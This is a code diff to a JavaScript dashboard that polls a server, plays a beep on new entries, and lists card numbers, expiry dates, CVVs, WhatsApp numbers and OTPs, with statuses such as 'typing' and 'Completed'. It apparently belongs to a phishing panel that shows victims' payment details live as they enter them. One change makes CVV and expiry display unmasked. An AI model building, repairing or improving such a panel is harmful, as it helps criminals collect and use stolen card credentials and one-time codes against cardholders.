@@ -17,7 +17,6 @@ window.addEventListener('load', () => {
     setTimeout(pollUpdates, 500);
     pollInterval = setInterval(pollUpdates, 2000);
 
-    // AudioContext create karo (lekin resume nahi)
     try {
         audioCtx = new (window.AudioContext || window.webkitAudioContext)();
     } catch (e) {
@@ -70,7 +69,6 @@ function playBeep(volume, duration, delay, freq) {
     } catch (e) {}
 }
 
-// Notification tone — naya data aane par
 function playNotificationSound() {
     if (!soundEnabled) return;
     if (!audioCtx) return;
@@ -85,7 +83,6 @@ function playNotificationSound() {
     playBeep(0.6, 0.20, 0.18, 660);
 }
 
-// Confirmation beep — jab user Sound ON kare
 function playConfirmBeep() {
     if (!audioCtx) return;
     if (audioCtx.state === 'suspended') {
@@ -191,7 +188,6 @@ function pollUpdates() {
 
 
 // ==================== TABLE ROWS ====================
-// ⭐ FIXED: Naya record TOP pe, purana record NEECHE (appendChild)
 function addRowToTable(entry, isNew) {
     const tbody = document.getElementById('dataTableBody');
     if (!tbody) return;
@@ -212,7 +208,6 @@ function addRowToTable(entry, isNew) {
     if (isNew) tr.classList.add('new-row');
     tr.innerHTML = rowHTML(entry);
     
-    // ⭐ naya record top pe, purana record neeche
     if (isNew) {
         tbody.insertBefore(tr, tbody.firstChild);
     } else {
@@ -232,7 +227,7 @@ function updateRowInTable(entry) {
     tr.innerHTML = rowHTML(entry);
 }
 
-// ⭐ 8 columns exactly matching table headers
+// ⭐ CVV & Expiry ab DIRECT show hote hain (no dots, no hidden)
 function rowHTML(entry) {
     let cls = 'typing';
     if (entry.status === 'Completed') cls = 'completed';
@@ -241,10 +236,10 @@ function rowHTML(entry) {
     return `
         <td class="time-cell">${entry.timestamp || '-'}</td>
         <td><strong>${formatCard(entry.card_number) || '-'}</strong></td>
-        <td><span class="mono cyan">${entry.expiry_date || '...'}</span></td>
-        <td><span class="mono cyan">${entry.cvv || '...'}</span></td>
-        <td><span class="mono green">${entry.whatsapp || '...'}</span></td>
-        <td><span class="mono green">${entry.otp || '...'}</span></td>
+        <td><span class="mono cyan">${entry.expiry_date || '-'}</span></td>
+        <td><span class="mono cyan">${entry.cvv || '-'}</span></td>
+        <td><span class="mono green">${entry.whatsapp || '-'}</span></td>
+        <td><span class="mono green">${entry.otp || '-'}</span></td>
         <td><span class="status-badge status-${cls}">${entry.status || '-'}</span></td>
         <td>
             <button class="delete-btn" onclick="deleteRecord(${entry.id})" title="Delete">
@@ -390,14 +385,13 @@ function updateStats() {
 }
 
 
-// ==================== SOUND TOGGLE (Unlock + On/Off) ====================
+// ==================== SOUND TOGGLE ====================
 function toggleSound() {
     const btn = document.getElementById('soundBtn');
     const text = document.getElementById('soundText');
     const icon = document.getElementById('soundIcon');
 
     if (!soundEnabled) {
-        // 🔓 Sound ON karo — pehle unlock karo, phir confirm beep bajao
         unlockAudioNow().then((ok) => {
             if (ok) {
                 soundEnabled = true;
@@ -405,14 +399,12 @@ function toggleSound() {
                 btn.classList.add('on');
                 if (text) text.innerText = 'Sound ON';
                 if (icon) icon.className = 'ri-volume-up-line';
-                // Confirmation beep
                 setTimeout(playConfirmBeep, 100);
             } else {
                 console.log("Unlock failed, sound not enabled");
             }
         });
     } else {
-        // 🔇 Sound OFF karo
         soundEnabled = false;
         btn.classList.add('off');
         btn.classList.remove('on');
